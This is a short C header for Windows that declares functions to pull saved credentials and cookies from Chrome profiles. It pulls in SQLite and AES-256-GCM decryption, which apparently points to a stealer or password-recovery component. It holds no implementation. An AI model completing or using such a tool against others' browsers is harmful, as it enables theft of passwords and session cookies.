#pragma once
#pragma comment (lib, "shlwapi.lib")

#include <windows.h>
#include <Shlwapi.h>
#include <conio.h>
#include <Wincrypt.h>
#include <stdlib.h>
#include <mbstring.h>
#include <stdio.h>
#include <memory.h>
#include <ShlObj.h>

#include "../sqlite3/sqlite3.h"
#include "../AES/AES-256-GCM.h"


VOID get_chrome_credentials();
VOID get_chrome_cookies();
LPWSTR get_chrome_profile_path(const wchar_t path[]);